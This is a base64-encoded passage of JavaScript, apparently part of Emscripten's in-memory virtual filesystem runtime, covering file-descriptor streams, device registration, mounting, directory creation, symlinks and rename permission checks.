IC8vIFRPRE86IGNoZWNrIGZvciBPX1NFQVJDSD8gKD09IHNlYXJjaCBmb3IgZGlyIG9ubHkpDQogICAgICAgICAgICByZXR1cm4gMzE7DQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBGUy5ub2RlUGVybWlzc2lvbnMobm9kZSwgRlMuZmxhZ3NUb1Blcm1pc3Npb25TdHJpbmcoZmxhZ3MpKTsNCiAgICAgIH0sTUFYX09QRU5fRkRTOjQwOTYsbmV4dGZkOmZ1bmN0aW9uKGZkX3N0YXJ0LCBmZF9lbmQpIHsNCiAgICAgICAgZmRfc3RhcnQgPSBmZF9zdGFydCB8fCAwOw0KICAgICAgICBmZF9lbmQgPSBmZF9lbmQgfHwgRlMuTUFYX09QRU5fRkRTOw0KICAgICAgICBmb3IgKHZhciBmZCA9IGZkX3N0YXJ0OyBmZCA8PSBmZF9lbmQ7IGZkKyspIHsNCiAgICAgICAgICBpZiAoIUZTLnN0cmVhbXNbZmRdKSB7DQogICAgICAgICAgICByZXR1cm4gZmQ7DQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDMzKTsNCiAgICAgIH0sZ2V0U3RyZWFtOmZ1bmN0aW9uKGZkKSB7DQogICAgICAgIHJldHVybiBGUy5zdHJlYW1zW2ZkXTsNCiAgICAgIH0sY3JlYXRlU3RyZWFtOmZ1bmN0aW9uKHN0cmVhbSwgZmRfc3RhcnQsIGZkX2VuZCkgew0KICAgICAgICBpZiAoIUZTLkZTU3RyZWFtKSB7DQogICAgICAgICAgRlMuRlNTdHJlYW0gPSAvKiogQGNvbnN0cnVjdG9yICovIGZ1bmN0aW9uKCl7fTsNCiAgICAgICAgICBGUy5GU1N0cmVhbS5wcm90b3R5cGUgPSB7DQogICAgICAgICAgICBvYmplY3Q6IHsNCiAgICAgICAgICAgICAgZ2V0OiBmdW5jdGlvbigpIHsgcmV0dXJuIHRoaXMubm9kZTsgfSwNCiAgICAgICAgICAgICAgc2V0OiBmdW5jdGlvbih2YWwpIHsgdGhpcy5ub2RlID0gdmFsOyB9DQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgaXNSZWFkOiB7DQogICAgICAgICAgICAgIGdldDogZnVuY3Rpb24oKSB7IHJldHVybiAodGhpcy5mbGFncyAmIDIwOTcxNTUpICE9PSAxOyB9DQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgaXNXcml0ZTogew0KICAgICAgICAgICAgICBnZXQ6IGZ1bmN0aW9uKCkgeyByZXR1cm4gKHRoaXMuZmxhZ3MgJiAyMDk3MTU1KSAhPT0gMDsgfQ0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgIGlzQXBwZW5kOiB7DQogICAgICAgICAgICAgIGdldDogZnVuY3Rpb24oKSB7IHJldHVybiAodGhpcy5mbGFncyAmIDEwMjQpOyB9DQogICAgICAgICAgICB9DQogICAgICAgICAgfTsNCiAgICAgICAgfQ0KICAgICAgICAvLyBjbG9uZSBpdCwgc28gd2UgY2FuIHJldHVybiBhbiBpbnN0YW5jZSBvZiBGU1N0cmVhbQ0KICAgICAgICB2YXIgbmV3U3RyZWFtID0gbmV3IEZTLkZTU3RyZWFtKCk7DQogICAgICAgIGZvciAodmFyIHAgaW4gc3RyZWFtKSB7DQogICAgICAgICAgbmV3U3RyZWFtW3BdID0gc3RyZWFtW3BdOw0KICAgICAgICB9DQogICAgICAgIHN0cmVhbSA9IG5ld1N0cmVhbTsNCiAgICAgICAgdmFyIGZkID0gRlMubmV4dGZkKGZkX3N0YXJ0LCBmZF9lbmQpOw0KICAgICAgICBzdHJlYW0uZmQgPSBmZDsNCiAgICAgICAgRlMuc3RyZWFtc1tmZF0gPSBzdHJlYW07DQogICAgICAgIHJldHVybiBzdHJlYW07DQogICAgICB9LGNsb3NlU3RyZWFtOmZ1bmN0aW9uKGZkKSB7DQogICAgICAgIEZTLnN0cmVhbXNbZmRdID0gbnVsbDsNCiAgICAgIH0sY2hyZGV2X3N0cmVhbV9vcHM6e29wZW46ZnVuY3Rpb24oc3RyZWFtKSB7DQogICAgICAgICAgdmFyIGRldmljZSA9IEZTLmdldERldmljZShzdHJlYW0ubm9kZS5yZGV2KTsNCiAgICAgICAgICAvLyBvdmVycmlkZSBub2RlJ3Mgc3RyZWFtIG9wcyB3aXRoIHRoZSBkZXZpY2Uncw0KICAgICAgICAgIHN0cmVhbS5zdHJlYW1fb3BzID0gZGV2aWNlLnN0cmVhbV9vcHM7DQogICAgICAgICAgLy8gZm9yd2FyZCB0aGUgb3BlbiBjYWxsDQogICAgICAgICAgaWYgKHN0cmVhbS5zdHJlYW1fb3BzLm9wZW4pIHsNCiAgICAgICAgICAgIHN0cmVhbS5zdHJlYW1fb3BzLm9wZW4oc3RyZWFtKTsNCiAgICAgICAgICB9DQogICAgICAgIH0sbGxzZWVrOmZ1bmN0aW9uKCkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDcwKTsNCiAgICAgICAgfX0sbWFqb3I6ZnVuY3Rpb24oZGV2KSB7DQogICAgICAgIHJldHVybiAoKGRldikgPj4gOCk7DQogICAgICB9LG1pbm9yOmZ1bmN0aW9uKGRldikgew0KICAgICAgICByZXR1cm4gKChkZXYpICYgMHhmZik7DQogICAgICB9LG1ha2VkZXY6ZnVuY3Rpb24obWEsIG1pKSB7DQogICAgICAgIHJldHVybiAoKG1hKSA8PCA4IHwgKG1pKSk7DQogICAgICB9LHJlZ2lzdGVyRGV2aWNlOmZ1bmN0aW9uKGRldiwgb3BzKSB7DQogICAgICAgIEZTLmRldmljZXNbZGV2XSA9IHsgc3RyZWFtX29wczogb3BzIH07DQogICAgICB9LGdldERldmljZTpmdW5jdGlvbihkZXYpIHsNCiAgICAgICAgcmV0dXJuIEZTLmRldmljZXNbZGV2XTsNCiAgICAgIH0sZ2V0TW91bnRzOmZ1bmN0aW9uKG1vdW50KSB7DQogICAgICAgIHZhciBtb3VudHMgPSBbXTsNCiAgICAgICAgdmFyIGNoZWNrID0gW21vdW50XTsNCiAgDQogICAgICAgIHdoaWxlIChjaGVjay5sZW5ndGgpIHsNCiAgICAgICAgICB2YXIgbSA9IGNoZWNrLnBvcCgpOw0KICANCiAgICAgICAgICBtb3VudHMucHVzaChtKTsNCiAgDQogICAgICAgICAgY2hlY2sucHVzaC5hcHBseShjaGVjaywgbS5tb3VudHMpOw0KICAgICAgICB9DQogIA0KICAgICAgICByZXR1cm4gbW91bnRzOw0KICAgICAgfSxzeW5jZnM6ZnVuY3Rpb24ocG9wdWxhdGUsIGNhbGxiYWNrKSB7DQogICAgICAgIGlmICh0eXBlb2YocG9wdWxhdGUpID09PSAnZnVuY3Rpb24nKSB7DQogICAgICAgICAgY2FsbGJhY2sgPSBwb3B1bGF0ZTsNCiAgICAgICAgICBwb3B1bGF0ZSA9IGZhbHNlOw0KICAgICAgICB9DQogIA0KICAgICAgICBGUy5zeW5jRlNSZXF1ZXN0cysrOw0KICANCiAgICAgICAgaWYgKEZTLnN5bmNGU1JlcXVlc3RzID4gMSkgew0KICAgICAgICAgIGVycignd2FybmluZzogJyArIEZTLnN5bmNGU1JlcXVlc3RzICsgJyBGUy5zeW5jZnMgb3BlcmF0aW9ucyBpbiBmbGlnaHQgYXQgb25jZSwgcHJvYmFibHkganVzdCBkb2luZyBleHRyYSB3b3JrJyk7DQogICAgICAgIH0NCiAgDQogICAgICAgIHZhciBtb3VudHMgPSBGUy5nZXRNb3VudHMoRlMucm9vdC5tb3VudCk7DQogICAgICAgIHZhciBjb21wbGV0ZWQgPSAwOw0KICANCiAgICAgICAgZnVuY3Rpb24gZG9DYWxsYmFjayhlcnJDb2RlKSB7DQogICAgICAgICAgYXNzZXJ0KEZTLnN5bmNGU1JlcXVlc3RzID4gMCk7DQogICAgICAgICAgRlMuc3luY0ZTUmVxdWVzdHMtLTsNCiAgICAgICAgICByZXR1cm4gY2FsbGJhY2soZXJyQ29kZSk7DQogICAgICAgIH0NCiAgDQogICAgICAgIGZ1bmN0aW9uIGRvbmUoZXJyQ29kZSkgew0KICAgICAgICAgIGlmIChlcnJDb2RlKSB7DQogICAgICAgICAgICBpZiAoIWRvbmUuZXJyb3JlZCkgew0KICAgICAgICAgICAgICBkb25lLmVycm9yZWQgPSB0cnVlOw0KICAgICAgICAgICAgICByZXR1cm4gZG9DYWxsYmFjayhlcnJDb2RlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICB9DQogICAgICAgICAgaWYgKCsrY29tcGxldGVkID49IG1vdW50cy5sZW5ndGgpIHsNCiAgICAgICAgICAgIGRvQ2FsbGJhY2sobnVsbCk7DQogICAgICAgICAgfQ0KICAgICAgICB9Ow0KICANCiAgICAgICAgLy8gc3luYyBhbGwgbW91bnRzDQogICAgICAgIG1vdW50cy5mb3JFYWNoKGZ1bmN0aW9uIChtb3VudCkgew0KICAgICAgICAgIGlmICghbW91bnQudHlwZS5zeW5jZnMpIHsNCiAgICAgICAgICAgIHJldHVybiBkb25lKG51bGwpOw0KICAgICAgICAgIH0NCiAgICAgICAgICBtb3VudC50eXBlLnN5bmNmcyhtb3VudCwgcG9wdWxhdGUsIGRvbmUpOw0KICAgICAgICB9KTsNCiAgICAgIH0sbW91bnQ6ZnVuY3Rpb24odHlwZSwgb3B0cywgbW91bnRwb2ludCkgew0KICAgICAgICBpZiAodHlwZW9mIHR5cGUgPT09ICdzdHJpbmcnKSB7DQogICAgICAgICAgLy8gVGhlIGZpbGVzeXN0ZW0gd2FzIG5vdCBpbmNsdWRlZCwgYW5kIGluc3RlYWQgd2UgaGF2ZSBhbiBlcnJvcg0KICAgICAgICAgIC8vIG1lc3NhZ2Ugc3RvcmVkIGluIHRoZSB2YXJpYWJsZS4NCiAgICAgICAgICB0aHJvdyB0eXBlOw0KICAgICAgICB9DQogICAgICAgIHZhciByb290ID0gbW91bnRwb2ludCA9PT0gJy8nOw0KICAgICAgICB2YXIgcHNldWRvID0gIW1vdW50cG9pbnQ7DQogICAgICAgIHZhciBub2RlOw0KICANCiAgICAgICAgaWYgKHJvb3QgJiYgRlMucm9vdCkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDEwKTsNCiAgICAgICAgfSBlbHNlIGlmICghcm9vdCAmJiAhcHNldWRvKSB7DQogICAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgobW91bnRwb2ludCwgeyBmb2xsb3dfbW91bnQ6IGZhbHNlIH0pOw0KICANCiAgICAgICAgICBtb3VudHBvaW50ID0gbG9va3VwLnBhdGg7ICAvLyB1c2UgdGhlIGFic29sdXRlIHBhdGgNCiAgICAgICAgICBub2RlID0gbG9va3VwLm5vZGU7DQogIA0KICAgICAgICAgIGlmIChGUy5pc01vdW50cG9pbnQobm9kZSkpIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDEwKTsNCiAgICAgICAgICB9DQogIA0KICAgICAgICAgIGlmICghRlMuaXNEaXIobm9kZS5tb2RlKSkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNTQpOw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICANCiAgICAgICAgdmFyIG1vdW50ID0gew0KICAgICAgICAgIHR5cGU6IHR5cGUsDQogICAgICAgICAgb3B0czogb3B0cywNCiAgICAgICAgICBtb3VudHBvaW50OiBtb3VudHBvaW50LA0KICAgICAgICAgIG1vdW50czogW10NCiAgICAgICAgfTsNCiAgDQogICAgICAgIC8vIGNyZWF0ZSBhIHJvb3Qgbm9kZSBmb3IgdGhlIGZzDQogICAgICAgIHZhciBtb3VudFJvb3QgPSB0eXBlLm1vdW50KG1vdW50KTsNCiAgICAgICAgbW91bnRSb290Lm1vdW50ID0gbW91bnQ7DQogICAgICAgIG1vdW50LnJvb3QgPSBtb3VudFJvb3Q7DQogIA0KICAgICAgICBpZiAocm9vdCkgew0KICAgICAgICAgIEZTLnJvb3QgPSBtb3VudFJvb3Q7DQogICAgICAgIH0gZWxzZSBpZiAobm9kZSkgew0KICAgICAgICAgIC8vIHNldCBhcyBhIG1vdW50cG9pbnQNCiAgICAgICAgICBub2RlLm1vdW50ZWQgPSBtb3VudDsNCiAgDQogICAgICAgICAgLy8gYWRkIHRoZSBuZXcgbW91bnQgdG8gdGhlIGN1cnJlbnQgbW91bnQncyBjaGlsZHJlbg0KICAgICAgICAgIGlmIChub2RlLm1vdW50KSB7DQogICAgICAgICAgICBub2RlLm1vdW50Lm1vdW50cy5wdXNoKG1vdW50KTsNCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgDQogICAgICAgIHJldHVybiBtb3VudFJvb3Q7DQogICAgICB9LHVubW91bnQ6ZnVuY3Rpb24gKG1vdW50cG9pbnQpIHsNCiAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgobW91bnRwb2ludCwgeyBmb2xsb3dfbW91bnQ6IGZhbHNlIH0pOw0KICANCiAgICAgICAgaWYgKCFGUy5pc01vdW50cG9pbnQobG9va3VwLm5vZGUpKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoMjgpOw0KICAgICAgICB9DQogIA0KICAgICAgICAvLyBkZXN0cm95IHRoZSBub2RlcyBmb3IgdGhpcyBtb3VudCwgYW5kIGFsbCBpdHMgY2hpbGQgbW91bnRzDQogICAgICAgIHZhciBub2RlID0gbG9va3VwLm5vZGU7DQogICAgICAgIHZhciBtb3VudCA9IG5vZGUubW91bnRlZDsNCiAgICAgICAgdmFyIG1vdW50cyA9IEZTLmdldE1vdW50cyhtb3VudCk7DQogIA0KICAgICAgICBPYmplY3Qua2V5cyhGUy5uYW1lVGFibGUpLmZvckVhY2goZnVuY3Rpb24gKGhhc2gpIHsNCiAgICAgICAgICB2YXIgY3VycmVudCA9IEZTLm5hbWVUYWJsZVtoYXNoXTsNCiAgDQogICAgICAgICAgd2hpbGUgKGN1cnJlbnQpIHsNCiAgICAgICAgICAgIHZhciBuZXh0ID0gY3VycmVudC5uYW1lX25leHQ7DQogIA0KICAgICAgICAgICAgaWYgKG1vdW50cy5pbmRleE9mKGN1cnJlbnQubW91bnQpICE9PSAtMSkgew0KICAgICAgICAgICAgICBGUy5kZXN0cm95Tm9kZShjdXJyZW50KTsNCiAgICAgICAgICAgIH0NCiAgDQogICAgICAgICAgICBjdXJyZW50ID0gbmV4dDsNCiAgICAgICAgICB9DQogICAgICAgIH0pOw0KICANCiAgICAgICAgLy8gbm8gbG9uZ2VyIGEgbW91bnRwb2ludA0KICAgICAgICBub2RlLm1vdW50ZWQgPSBudWxsOw0KICANCiAgICAgICAgLy8gcmVtb3ZlIHRoaXMgbW91bnQgZnJvbSB0aGUgY2hpbGQgbW91bnRzDQogICAgICAgIHZhciBpZHggPSBub2RlLm1vdW50Lm1vdW50cy5pbmRleE9mKG1vdW50KTsNCiAgICAgICAgYXNzZXJ0KGlkeCAhPT0gLTEpOw0KICAgICAgICBub2RlLm1vdW50Lm1vdW50cy5zcGxpY2UoaWR4LCAxKTsNCiAgICAgIH0sbG9va3VwOmZ1bmN0aW9uKHBhcmVudCwgbmFtZSkgew0KICAgICAgICByZXR1cm4gcGFyZW50Lm5vZGVfb3BzLmxvb2t1cChwYXJlbnQsIG5hbWUpOw0KICAgICAgfSxta25vZDpmdW5jdGlvbihwYXRoLCBtb2RlLCBkZXYpIHsNCiAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgocGF0aCwgeyBwYXJlbnQ6IHRydWUgfSk7DQogICAgICAgIHZhciBwYXJlbnQgPSBsb29rdXAubm9kZTsNCiAgICAgICAgdmFyIG5hbWUgPSBQQVRILmJhc2VuYW1lKHBhdGgpOw0KICAgICAgICBpZiAoIW5hbWUgfHwgbmFtZSA9PT0gJy4nIHx8IG5hbWUgPT09ICcuLicpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigyOCk7DQogICAgICAgIH0NCiAgICAgICAgdmFyIGVyckNvZGUgPSBGUy5tYXlDcmVhdGUocGFyZW50LCBuYW1lKTsNCiAgICAgICAgaWYgKGVyckNvZGUpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnJDb2RlKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIXBhcmVudC5ub2RlX29wcy5ta25vZCkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDYzKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gcGFyZW50Lm5vZGVfb3BzLm1rbm9kKHBhcmVudCwgbmFtZSwgbW9kZSwgZGV2KTsNCiAgICAgIH0sY3JlYXRlOmZ1bmN0aW9uKHBhdGgsIG1vZGUpIHsNCiAgICAgICAgbW9kZSA9IG1vZGUgIT09IHVuZGVmaW5lZCA/IG1vZGUgOiA0MzggLyogMDY2NiAqLzsNCiAgICAgICAgbW9kZSAmPSA0MDk1Ow0KICAgICAgICBtb2RlIHw9IDMyNzY4Ow0KICAgICAgICByZXR1cm4gRlMubWtub2QocGF0aCwgbW9kZSwgMCk7DQogICAgICB9LG1rZGlyOmZ1bmN0aW9uKHBhdGgsIG1vZGUpIHsNCiAgICAgICAgbW9kZSA9IG1vZGUgIT09IHVuZGVmaW5lZCA/IG1vZGUgOiA1MTEgLyogMDc3NyAqLzsNCiAgICAgICAgbW9kZSAmPSA1MTEgfCA1MTI7DQogICAgICAgIG1vZGUgfD0gMTYzODQ7DQogICAgICAgIHJldHVybiBGUy5ta25vZChwYXRoLCBtb2RlLCAwKTsNCiAgICAgIH0sbWtkaXJUcmVlOmZ1bmN0aW9uKHBhdGgsIG1vZGUpIHsNCiAgICAgICAgdmFyIGRpcnMgPSBwYXRoLnNwbGl0KCcvJyk7DQogICAgICAgIHZhciBkID0gJyc7DQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgZGlycy5sZW5ndGg7ICsraSkgew0KICAgICAgICAgIGlmICghZGlyc1tpXSkgY29udGludWU7DQogICAgICAgICAgZCArPSAnLycgKyBkaXJzW2ldOw0KICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICBGUy5ta2RpcihkLCBtb2RlKTsNCiAgICAgICAgICB9IGNhdGNoKGUpIHsNCiAgICAgICAgICAgIGlmIChlLmVycm5vICE9IDIwKSB0aHJvdyBlOw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgfSxta2RldjpmdW5jdGlvbihwYXRoLCBtb2RlLCBkZXYpIHsNCiAgICAgICAgaWYgKHR5cGVvZihkZXYpID09PSAndW5kZWZpbmVkJykgew0KICAgICAgICAgIGRldiA9IG1vZGU7DQogICAgICAgICAgbW9kZSA9IDQzOCAvKiAwNjY2ICovOw0KICAgICAgICB9DQogICAgICAgIG1vZGUgfD0gODE5MjsNCiAgICAgICAgcmV0dXJuIEZTLm1rbm9kKHBhdGgsIG1vZGUsIGRldik7DQogICAgICB9LHN5bWxpbms6ZnVuY3Rpb24ob2xkcGF0aCwgbmV3cGF0aCkgew0KICAgICAgICBpZiAoIVBBVEhfRlMucmVzb2x2ZShvbGRwYXRoKSkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDQ0KTsNCiAgICAgICAgfQ0KICAgICAgICB2YXIgbG9va3VwID0gRlMubG9va3VwUGF0aChuZXdwYXRoLCB7IHBhcmVudDogdHJ1ZSB9KTsNCiAgICAgICAgdmFyIHBhcmVudCA9IGxvb2t1cC5ub2RlOw0KICAgICAgICBpZiAoIXBhcmVudCkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDQ0KTsNCiAgICAgICAgfQ0KICAgICAgICB2YXIgbmV3bmFtZSA9IFBBVEguYmFzZW5hbWUobmV3cGF0aCk7DQogICAgICAgIHZhciBlcnJDb2RlID0gRlMubWF5Q3JlYXRlKHBhcmVudCwgbmV3bmFtZSk7DQogICAgICAgIGlmIChlcnJDb2RlKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoZXJyQ29kZSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFwYXJlbnQubm9kZV9vcHMuc3ltbGluaykgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDYzKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gcGFyZW50Lm5vZGVfb3BzLnN5bWxpbmsocGFyZW50LCBuZXduYW1lLCBvbGRwYXRoKTsNCiAgICAgIH0scmVuYW1lOmZ1bmN0aW9uKG9sZF9wYXRoLCBuZXdfcGF0aCkgew0KICAgICAgICB2YXIgb2xkX2Rpcm5hbWUgPSBQQVRILmRpcm5hbWUob2xkX3BhdGgpOw0KICAgICAgICB2YXIgbmV3X2Rpcm5hbWUgPSBQQVRILmRpcm5hbWUobmV3X3BhdGgpOw0KICAgICAgICB2YXIgb2xkX25hbWUgPSBQQVRILmJhc2VuYW1lKG9sZF9wYXRoKTsNCiAgICAgICAgdmFyIG5ld19uYW1lID0gUEFUSC5iYXNlbmFtZShuZXdfcGF0aCk7DQogICAgICAgIC8vIHBhcmVudHMgbXVzdCBleGlzdA0KICAgICAgICB2YXIgbG9va3VwLCBvbGRfZGlyLCBuZXdfZGlyOw0KICAgICAgICB0cnkgew0KICAgICAgICAgIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgob2xkX3BhdGgsIHsgcGFyZW50OiB0cnVlIH0pOw0KICAgICAgICAgIG9sZF9kaXIgPSBsb29rdXAubm9kZTsNCiAgICAgICAgICBsb29rdXAgPSBGUy5sb29rdXBQYXRoKG5ld19wYXRoLCB7IHBhcmVudDogdHJ1ZSB9KTsNCiAgICAgICAgICBuZXdfZGlyID0gbG9va3VwLm5vZGU7DQogICAgICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigxMCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFvbGRfZGlyIHx8ICFuZXdfZGlyKSB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig0NCk7DQogICAgICAgIC8vIG5lZWQgdG8gYmUgcGFydCBvZiB0aGUgc2FtZSBtb3VudA0KICAgICAgICBpZiAob2xkX2Rpci5tb3VudCAhPT0gbmV3X2Rpci5tb3VudCkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDc1KTsNCiAgICAgICAgfQ0KICAgICAgICAvLyBzb3VyY2UgbXVzdCBleGlzdA0KICAgICAgICB2YXIgb2xkX25vZGUgPSBGUy5sb29rdXBOb2RlKG9sZF9kaXIsIG9sZF9uYW1lKTsNCiAgICAgICAgLy8gb2xkIHBhdGggc2hvdWxkIG5vdCBiZSBhbiBhbmNlc3RvciBvZiB0aGUgbmV3IHBhdGgNCiAgICAgICAgdmFyIHJlbGF0aXZlID0gUEFUSF9GUy5yZWxhdGl2ZShvbGRfcGF0aCwgbmV3X2Rpcm5hbWUpOw0KICAgICAgICBpZiAocmVsYXRpdmUuY2hhckF0KDApICE9PSAnLicpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigyOCk7DQogICAgICAgIH0NCiAgICAgICAgLy8gbmV3IHBhdGggc2hvdWxkIG5vdCBiZSBhbiBhbmNlc3RvciBvZiB0aGUgb2xkIHBhdGgNCiAgICAgICAgcmVsYXRpdmUgPSBQQVRIX0ZTLnJlbGF0aXZlKG5ld19wYXRoLCBvbGRfZGlybmFtZSk7DQogICAgICAgIGlmIChyZWxhdGl2ZS5jaGFyQXQoMCkgIT09ICcuJykgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDU1KTsNCiAgICAgICAgfQ0KICAgICAgICAvLyBzZWUgaWYgdGhlIG5ldyBwYXRoIGFscmVhZHkgZXhpc3RzDQogICAgICAgIHZhciBuZXdfbm9kZTsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICBuZXdfbm9kZSA9IEZTLmxvb2t1cE5vZGUobmV3X2RpciwgbmV3X25hbWUpOw0KICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgLy8gbm90IGZhdGFsDQogICAgICAgIH0NCiAgICAgICAgLy8gZWFybHkgb3V0IGlmIG5vdGhpbmcgbmVlZHMgdG8gY2hhbmdlDQogICAgICAgIGlmIChvbGRfbm9kZSA9PT0gbmV3X25vZGUpIHsNCiAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICAgICAgLy8gd2UnbGwgbmVlZCB0byBkZWxldGUgdGhlIG9sZCBlbnRyeQ0KICAgICAgICB2YXIgaXNkaXIgPSBGUy5pc0RpcihvbGRfbm9kZS5tb2RlKTsNCiAgICAgICAgdmFyIGVyckNvZGUgPSBGUy5tYXlEZWxldGUob2xkX2Rpciwgb2xkX25hbWUsIGlzZGlyKTsNCiAgICAgICAgaWYgKGVyckNvZGUpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnJDb2RlKTsNCiAgICAgICAgfQ0KICAgICAgICAvLyBuZWVkIGRlbGV0ZSBwZXJtaXNzaW9ucyBpZiB3ZSdsbCBiZSBvdmVyd3JpdGluZy4NCiAgICAgICAgLy8gbmVlZCBjcmVhdGUgcGVybWlzc2lvbnMgaWYgbmV3IGRvZXNuJ3QgYWxyZWFkeSBleGlzdC4NCiAgICAgICAgZXJyQ29kZSA9IG5ld19ub2RlID8NCiAgICAgICAgICBGUy5tYXlEZWxldGUobmV3X2RpciwgbmV3X25hbWUsIGlzZGlyKSA6DQogICAgICAgICAgRlMubWF5Q3JlYXRlKG5ld19kaXIsIG5ld19uYW1lKTsNCiAgICAgICAgaWYgKGVyckNvZGUpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnJDb2RlKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIW9sZF9kaXIubm9kZV9vcHMucmVuYW1lKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNjMpOw0KICAgICAgICB9DQogICAgICAgIGlmIChGUy5pc01vdW50cG9pbnQob2xkX25vZGUpIHx8IChuZXdfbm9kZSAmJiBGUy5pc01vdW50cG9pbnQobmV3X25vZGUpKSkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDEwKTsNCiAgICAgICAgfQ0KICAgICAgICAvLyBpZiB3ZSBhcmUgZ29pbmcgdG8gY2hhbmdlIHRoZSBwYXJlbnQsIGNoZWNrIHdyaXRlIHBlcm1pc3Npb25zDQogICAgICAgIGlmIChuZXdfZGlyICE9PSBvbGRfZGlyKSB7DQogICAgICAgICAgZXJyQ29kZSA9IEZTLm5vZGVQZXJtaXNzaW9ucyhvbGRfZGlyLCAndycpOw0KICAgICAgICAgIGlmIChlcnJDb2RlKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnJDb2RlKTsNCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICBpZiAoRlMudHJhY2tpbmdEZWxlZ2F0ZVsnd2lsbE1vdmVQYXRoJ10pIHsNCiAgICAgICAgICAgIEZTLnRyYWNraW5nRGVsZWdhdGVbJ3dpbGxNb3ZlUGF0aCddKG9sZF9wYXRoLCBuZXdfcGF0aCk7DQogICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoKGUpIHsNCiAgICAgICAgICBlcnIoIkZTLnRyYWNraW5nRGVsZWdhdGVbJ3dpbGxNb3ZlUGF0aCddKCciK29sZF9wYXRoKyInLCAnIituZXdfcGF0aCsiJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiICsgZS5tZXNzYWdlKTsNCiAgICAgICAgfQ0KICAgICAgICAvLyByZW1vdmUgdGhlIG5vZGUgZnJvbSB0aGUgbG9va3VwIGhhc2gNCiAgICAgICAgRlMuaGFzaFJlbW92ZU5vZGUob2xkX25vZGUpOw0KICAgICAgICAvLyBkbyB0aGUgdW5kZXJseWluZyBmcyByZW5hbWUNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICBvbGRfZGlyLm5vZGVfb3BzLnJlbmFtZShvbGRfbm9kZSwgbmV3X2RpciwgbmV3X25hbWUpOw0KICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgdGhyb3cgZTsNCiAgICAgICAgfSBmaW5hbGx5IHsNCiAgICAgICAgICAvLyBhZGQgdGhlIG5vZGUgYmFjayB0byB0aGUgaGFzaCAoaW4gY2FzZSBub2RlX29wcy5yZW5hbWUNCiAgICAgICAgICAvLyBjaGFuZ2VkIGl0cyBuYW1lKQ0KICAgICAgICAgIEZTLmhhc2hBZGROb2RlKG9sZF9ub2RlKTsNCiAgICAgICAgfQ0KICAgICAgICB0cnkgew0KICAgICAgICAgIGlmIChGUy50cmFja2luZ0RlbGVnYXRlWydvbk1vdmVQYXRoJ10pIEZTLnRyYWNraW5nRGVsZWdhdGVbJ29uTW92ZVBhdGgnXShvbGRfcGF0aCwgbmV3X3BhdGgpOw0KICAgICAgICB9IGNhdGNoKGUpIHsNCiAgICAgICAgICBlcnIoIkZTLnRyYWNraW5nRGVsZWdhdGVbJ29uTW92ZVBhdGgnXSgnIitvbGRfcGF0aCsiJywgJyIrbmV3X3BhdGgrIicpIHRocmV3IGFuIGV4Y2VwdGlvbjogIiArIGUubWVzc2FnZSk7DQogICAgICAgIH0NCiAgICAgIH0scm1ka